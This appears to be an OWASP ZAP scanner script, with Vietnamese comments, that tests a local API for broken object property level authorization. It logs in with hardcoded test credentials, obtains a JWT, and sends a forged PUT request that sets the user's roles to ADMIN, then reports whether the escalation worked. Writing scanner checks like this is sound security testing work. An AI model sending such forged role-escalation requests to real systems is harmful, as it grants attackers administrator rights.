// Java class mapping
var HttpSender = Java.type("org.parosproxy.paros.network.HttpSender");
var HttpMessage = Java.type("org.parosproxy.paros.network.HttpMessage");
var URI = Java.type("org.apache.commons.httpclient.URI");
var HttpHeader = Java.type("org.parosproxy.paros.network.HttpHeader");
var FileWriter = Java.type("java.io.FileWriter");
var BufferedWriter = Java.type("java.io.BufferedWriter");
var SimpleDateFormat = Java.type("java.text.SimpleDateFormat");
var Date = Java.type("java.util.Date");
// Gán thông tin đăng nhập API
var loginUrl = "http://localhost:8080/auth/log-in";
var loginBody = '{"username":"orabSihc","password":"orab1234567"}';
var token = null;

var updateBody = {
  firstName: "orab",
  lastName: "sihc",
  password: "orab1234567",
  email: "orab@gmail.com",
  roles: ["ADMIN"],
};

// === Thông tin log ===
var logFile = "/zap/wrk/scan-log.txt";
var writer = new BufferedWriter(new FileWriter(logFile, true)); // mở file ở chế độ append

writer.write("[API3.js] Gửi request đến ...\n");
writer.flush();
writer.close();

var formatter = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");

// === Khởi tạo log file ===
function initLog() {
  writer = new BufferedWriter(new FileWriter(logFile, true));
  var now = formatter.format(new Date());
  writer.write("\n=== BOPLA Scan Log - " + now + " ===\n");
  writer.flush();
}

function cleanup() {
  if (writer != null) {
    writer.close();
  }
}

function getJwtToken() {
  try {
    var loginMsg = new HttpMessage(new URI(loginUrl, false));
    loginMsg.getRequestHeader().setMethod("POST");
    loginMsg
      .getRequestHeader()
      .setHeader(HttpHeader.CONTENT_TYPE, "application/json");
    loginMsg.setRequestBody(loginBody);
    loginMsg.getRequestHeader().setContentLength(loginBody.length);

    var sender = new HttpSender(HttpSender.MANUAL_REQUEST_INITIATOR);
    sender.sendAndReceive(loginMsg, true);

    var response = loginMsg.getResponseBody().toString();
    var parsed = JSON.parse(response);

    return parsed.token;
  } catch (e) {
    print("[ERROR] Cannot get token: " + e);
    return null;
  }
}

function sendingRequest(msg, initiator, helper) {
  var uri = msg.getRequestHeader().getURI().toString();

  if (uri.contains("/user/update/")) {
    // Gọi initLog nếu chưa mở file log
    if (writer == null) {
      initLog();
    }

    if (token == null) {
      token = getJwtToken();
      if (!token) {
        // print("[ERROR] Could not get token");
        return;
      } else {
        // print("[INFO] Token obtained: " + token);
      }
    }
    try {
      var newUri = "http://localhost:8080/user/update/orabSihc";
      var forgedMsg = new HttpMessage(new URI(newUri, false));
      var header = forgedMsg.getRequestHeader();

      header.setMethod("PUT");
      header.setHeader(HttpHeader.CONTENT_TYPE, "application/json");
      header.setHeader("Authorization", "Bearer " + token);

      var jsonBody = JSON.stringify(updateBody);
      forgedMsg.setRequestBody(jsonBody);
      header.setContentLength(jsonBody.length);

      var sender = new HttpSender(HttpSender.MANUAL_REQUEST_INITIATOR);
      sender.sendAndReceive(forgedMsg, true);

      var status = forgedMsg.getResponseHeader().getStatusCode();
      print("[*] Update Completed " + ": status: " + status);
      var timestamp = formatter.format(new Date());
      var response = forgedMsg.getResponseBody().toString();
      var parsed = JSON.parse(response);
      if (status === 200 && !!parsed.roles) {
        print("BOPLA found!!!");
      } else {
        print("SAFE!");
      }
    } catch (e) {}
  }
  cleanup();
}

function responseReceived(msg, initiator, helper) {
  // Không xử lý phản hồi chính gốc
}
